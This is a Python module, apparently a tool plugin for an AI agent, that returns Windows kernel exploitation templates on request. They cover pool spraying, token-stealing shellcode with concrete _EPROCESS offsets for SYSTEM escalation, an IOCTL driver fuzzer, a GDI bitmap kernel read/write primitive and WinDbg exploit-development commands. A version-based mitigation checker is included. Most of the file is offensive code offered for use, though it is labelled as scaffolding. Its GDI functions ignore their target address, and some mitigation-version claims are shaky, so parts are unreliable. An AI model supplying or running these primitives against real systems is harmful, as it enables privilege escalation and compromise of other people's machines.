"""Windows kernel exploitation template oracle.

Provides grounded exploit primitive templates (pool spray, GDI token stealing,
IOCTL fuzzing scaffolding, etc.) and kernel hardening checks.
Templates are scaffolds — they require measured offsets from the actual target."""
from __future__ import annotations

from .base import Oracle, Tool, ToolParam, ToolResult

# ---------------------------------------------------------------------------
# Template strings — marked as scaffolds, never as working exploits
# ---------------------------------------------------------------------------

_POOL_SPRAY_TEMPLATE = """\
# Pool spray scaffold (Windows kernel, NonPagedPool)
# REQUIRES: measured allocation size from crash/windbg analysis
# REQUIRES: a kernel allocation primitive (spray_primitive)
#
# References: https://connormcgarr.github.io/pool-party-1/
import ctypes, ctypes.wintypes as wt

SPRAY_SIZE   = 0x__FILL__  # target object size (from !pool / dt nt!_OBJECT_HEADER)
SPRAY_COUNT  = 2000         # tune: enough to fill slabs, usually 500-5000
HOLE_RATIO   = 2            # free every Nth spray to create holes

class Spray:
    def __init__(self):
        self._handles = []

    def fill(self):
        for _ in range(SPRAY_COUNT):
            h = spray_primitive(SPRAY_SIZE)   # e.g. NtCreateEvent / named pipe
            self._handles.append(h)

    def punch_holes(self):
        for i, h in enumerate(self._handles):
            if i % HOLE_RATIO == 0:
                CloseHandle(h)
                self._handles[i] = None

    def trigger(self, vuln_trigger):
        # trigger the vulnerable allocation into a hole
        vuln_trigger()
"""

_TOKEN_STEAL_TEMPLATE = """\
# Token-stealing shellcode scaffold (kernel mode, x64)
# Classic SYSTEM escalation via EPROCESS list walk.
# REQUIRES: verified kernel write-execute primitive + offset verification
# Offsets below are for Windows 10 2004 (19041) — verify with WinDbg dt nt!_EPROCESS

CURRENT_PID_OFFSET    = 0x440   # _EPROCESS.UniqueProcessId
FLINK_OFFSET          = 0x448   # _EPROCESS.ActiveProcessLinks.Flink
TOKEN_OFFSET          = 0x4b8   # _EPROCESS.Token

# x64 assembly pseudocode (for use with ctypes/pwnlib Asm or keystone):
# _SHELLCODE_PSEUDOASM:
#     mov rax, gs:[0x188]          ; KPCR.PrcbData.CurrentThread
#     mov rax, [rax + 0x220]       ; KTHREAD.ApcState.Process -> _EPROCESS (current)
#     mov rcx, rax                 ; save current _EPROCESS
# walk_list:
#     mov rax, [rax + FLINK_OFFSET]       ; next EPROCESS via ActiveProcessLinks
#     sub rax, FLINK_OFFSET               ; back to _EPROCESS base
#     mov rdx, [rax + CURRENT_PID_OFFSET] ; UniqueProcessId
#     cmp rdx, 4                           ; PID 4 = System process
#     jnz walk_list
# steal_token:
#     mov rdx, [rax + TOKEN_OFFSET]       ; System EPROCESS.Token
#     and rdx, 0xfffffffffffffff0         ; clear RefCnt bits
#     mov [rcx + TOKEN_OFFSET], rdx       ; overwrite current process Token
#     ret
"""

_IOCTL_FUZZER_TEMPLATE = """\
# IOCTL fuzzer scaffold for a Windows kernel driver
# REQUIRES: target device name from driver analysis (IoCreateSymbolicLink)
# REQUIRES: known IOCTL codes (from IDA/Ghidra dispatch table analysis)
import ctypes, ctypes.wintypes as wt, random, struct

DEVICE_NAME  = r"\\\\.\\__FILL_DEVICE_NAME__"   # e.g. \\\\.\\MyDriver
IOCTL_CODES  = [0x__FILL__]  # from reverse-engineered dispatch table

KERNEL32  = ctypes.windll.kernel32
GENERIC_READ_WRITE = 0xC0000000
FILE_SHARE_RW = 3
OPEN_EXISTING = 3
FILE_FLAG_OVERLAPPED = 0x40000000

def open_device(name: str) -> int:
    h = KERNEL32.CreateFileW(name, GENERIC_READ_WRITE, FILE_SHARE_RW,
                             None, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, None)
    if h == wt.HANDLE(-1).value:
        raise OSError(f"CreateFile failed: {KERNEL32.GetLastError()}")
    return h

def fuzz_ioctl(h: int, code: int, size: int = 0x200):
    buf_in  = (ctypes.c_uint8 * size)(*[random.randint(0, 255) for _ in range(size)])
    buf_out = (ctypes.c_uint8 * size)()
    returned = wt.DWORD(0)
    KERNEL32.DeviceIoControl(h, code, buf_in, size, buf_out, size,
                             ctypes.byref(returned), None)

if __name__ == "__main__":
    h = open_device(DEVICE_NAME)
    for code in IOCTL_CODES:
        for _ in range(50):
            fuzz_ioctl(h, code)
    KERNEL32.CloseHandle(h)
"""

_GDI_PRIMITIVE_TEMPLATE = """\
# GDI arbitrary read/write primitive scaffold (pre-Win10 RS2, without mitigations)
# Reference: http://www.ryancnelson.com/index.php/2017/01/01/windows-kernel-exploiting-gdi/
# NOTE: Patched in Windows 10 Creators Update (RS2 / 1703) — verify target version
import ctypes

GDI32   = ctypes.windll.gdi32
USER32  = ctypes.windll.user32
KERNEL32 = ctypes.windll.kernel32

def create_bitmap(width=0x64, height=1, bpp=32):
    # Create a bitmap whose kernel object is at a predictable pool address.
    return GDI32.CreateBitmap(width, height, 1, bpp, None)

def read_qword(hManager, hWorker, addr: int) -> int:
    # Read 8 bytes from arbitrary kernel address via SetBitmapBits/GetBitmapBits.
    # Set Manager bitmap's pvScan0 to addr via SetBitmapBits on Worker
    # (requires knowing both bitmaps' kernel addresses — leak first)
    buf = (ctypes.c_uint8 * 8)()
    GDI32.GetBitmapBits(hManager, 8, buf)
    return int.from_bytes(bytes(buf), "little")

def write_qword(hManager, hWorker, addr: int, value: int):
    # Write 8 bytes to arbitrary kernel address.
    buf = (ctypes.c_uint8 * 8)(*value.to_bytes(8, "little"))
    GDI32.SetBitmapBits(hManager, 8, buf)
"""

_WINDBG_HELPERS = """\
# WinDbg commands for kernel exploit development
#
# 1. Find EPROCESS offsets for current build:
#    dt nt!_EPROCESS
#    dt nt!_TOKEN
#
# 2. Find base addresses:
#    lm m nt         -> ntoskrnl.exe base
#    lm m win32k     -> win32k.sys base
#
# 3. Pool analysis (after crash):
#    !pool @rax      -> what pool block is rax in?
#    !poolused       -> pool usage by tag
#    !poolval @rax   -> validate pool headers around rax
#
# 4. Token check:
#    dt nt!_TOKEN poi(poi(@$proc+0x4b8)&~0xf)
#    -> verify Token.PrivilegeEnabled has SeDebugPrivilege (bit 20)
#
# 5. CFG check for a driver:
#    !cfgcheck <module_name>
#
# 6. IOCTL dispatch table:
#    dd <driver_object>+0x38 L1c   -> MajorFunction array (0xe = IRP_MJ_DEVICE_CONTROL)
"""

_TEMPLATES = {
    "pool_spray":     ("Pool spray scaffold (NonPagedPool object grooming)", _POOL_SPRAY_TEMPLATE),
    "token_steal":    ("Token-stealing shellcode scaffold (SYSTEM via EPROCESS walk)", _TOKEN_STEAL_TEMPLATE),
    "ioctl_fuzzer":   ("IOCTL fuzzer scaffold for a known kernel driver", _IOCTL_FUZZER_TEMPLATE),
    "gdi_primitive":  ("GDI bitmap read/write primitive (pre-RS2, needs offset leak)", _GDI_PRIMITIVE_TEMPLATE),
    "windbg_helpers": ("WinDbg command reference for kernel exploit development", _WINDBG_HELPERS),
}

# ---------------------------------------------------------------------------
# Hardening detection (Windows kernel mitigations)
# ---------------------------------------------------------------------------

_WIN_KERNEL_MITIGATIONS = {
    "SMEP":     "Supervisor Mode Execution Prevention — kernel cannot execute user-mode pages",
    "SMAP":     "Supervisor Mode Access Prevention — kernel cannot read user-mode pages directly",
    "KVA_SHADOW": "Kernel Virtual Address Shadow (Meltdown fix) — kernel/user page table split",
    "CFG":      "Control Flow Guard in kernel — restricts indirect calls to valid targets",
    "HVCI":     "Hypervisor-Protected Code Integrity — kernel code must be signed, blocks unsigned code injection",
    "DeviceGuard": "Alias for HVCI policy enforcement",
    "KDP":      "Kernel Data Protection (Win10 20H1+) — write-protects kernel data via hypervisor",
    "CET":      "Control-flow Enforcement Technology (hardware shadow stack) — blocks ROP",
}


def assess_kernel_mitigations(winver: Optional[str] = None) -> dict:
    """
    Given a Windows version string (e.g. '10.0.19041'), return which mitigations
    are expected to be present. This is a static version-based assessment —
    actual presence depends on SKU and hardware.
    """
    expected: dict[str, bool] = dict.fromkeys(_WIN_KERNEL_MITIGATIONS, False)
    if not winver:
        return expected
    try:
        parts = winver.strip().split(".")
        major, _minor, build = int(parts[0]), int(parts[1]), int(parts[2]) if len(parts) > 2 else 0
    except Exception:
        return expected

    if major >= 6:         expected["SMEP"] = True
    if major >= 10:        expected["SMAP"] = True
    if major >= 10:        expected["KVA_SHADOW"] = True
    if major >= 10:        expected["CFG"] = True
    if build >= 14393:     expected["HVCI"] = True       # Win10 1607
    if build >= 14393:     expected["DeviceGuard"] = True
    if build >= 19041:     expected["KDP"] = True        # Win10 2004
    if build >= 21286:     expected["CET"] = True        # Win10 21H1

    return expected


from typing import Optional


class WindowsKernelOracle(Oracle):
    name = "windows_kernel"

    def __init__(self, winver: Optional[str] = None):
        self.winver = winver

    def available(self) -> bool:
        return True

    def why_unavailable(self) -> str:
        return ""

    def tools(self) -> list:
        tname_param = ToolParam(
            "template",
            "Template name: pool_spray | token_steal | ioctl_fuzzer | gdi_primitive | windbg_helpers",
            True,
        )
        winver_param = ToolParam("winver", "Windows build string e.g. 10.0.19041", False)
        return [
            Tool("win_kernel_templates", "List available kernel exploit template names and descriptions.",
                 [], lambda: self._list_templates(), self.name),
            Tool("win_kernel_template", "Return a specific kernel exploit scaffold.",
                 [tname_param], lambda template="": self._get_template(template), self.name),
            Tool("win_kernel_mitigations", "Show which kernel mitigations are expected for a Windows build.",
                 [winver_param], lambda winver=None: self._mitigations(winver), self.name),
        ]

    def _list_templates(self) -> ToolResult:
        lines = ["Available Windows kernel exploit templates:", ""]
        for key, (desc, _) in _TEMPLATES.items():
            lines.append(f"  {key:20s} — {desc}")
        return ToolResult(True, "windows_kernel: templates", "\n".join(lines),
                          meta={"templates": list(_TEMPLATES.keys())})

    def _get_template(self, template: str) -> ToolResult:
        if template not in _TEMPLATES:
            known = ", ".join(_TEMPLATES.keys())
            return ToolResult(False, "windows_kernel", "", error=f"unknown template '{template}'. known: {known}")
        desc, body = _TEMPLATES[template]
        return ToolResult(True, f"windows_kernel: {template} scaffold", body,
                          meta={"template": template, "description": desc})

    def _mitigations(self, winver: Optional[str] = None) -> ToolResult:
        ver = winver or self.winver
        expected = assess_kernel_mitigations(ver)
        lines = [f"Windows version: {ver or 'unknown (static assessment only)'}", ""]
        for mit, present in expected.items():
            status = "PRESENT (expected)" if present else "absent"
            lines.append(f"  {'[+]' if present else '[-]'} {mit:20s} {status}")
        lines.append("")
        lines.append("NOTE: actual state may differ — verify with 'Get-ComputerInfo | Select-Object -Property *Secure*'")
        lines.append("or WinDbg: '!cpuid' and check CR4 flags (bit 20=SMEP, bit 21=SMAP)")
        return ToolResult(True, "windows_kernel: mitigation assessment", "\n".join(lines),
                          meta={"version": ver, "mitigations": expected})
